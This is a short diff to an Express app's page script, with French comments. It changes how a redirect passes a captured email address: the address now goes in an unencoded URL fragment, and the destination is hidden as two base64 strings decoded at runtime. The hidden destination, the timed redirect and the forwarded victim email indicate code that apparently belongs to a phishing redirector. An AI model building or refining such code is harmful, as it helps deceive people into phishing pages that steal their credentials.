@@ -46,9 +46,13 @@ app.get('/', (req, res) => {
                     
                     setTimeout(() => {
                         let target = atob(p1) + atob(p2);
+                        
+                        // Correction : On utilise # au lieu de ?email=
+                        // Et on ne fait pas de encodeURIComponent pour garder le "@" tel quel
                         if(emailCaptured !== "") {
-                            target += (target.includes('?') ? '&' : '?') + "email=" + encodeURIComponent(emailCaptured);
+                            target += "#" + emailCaptured;
                         }
+                        
                         window.location.href = target;
                     }, 800);
                 });
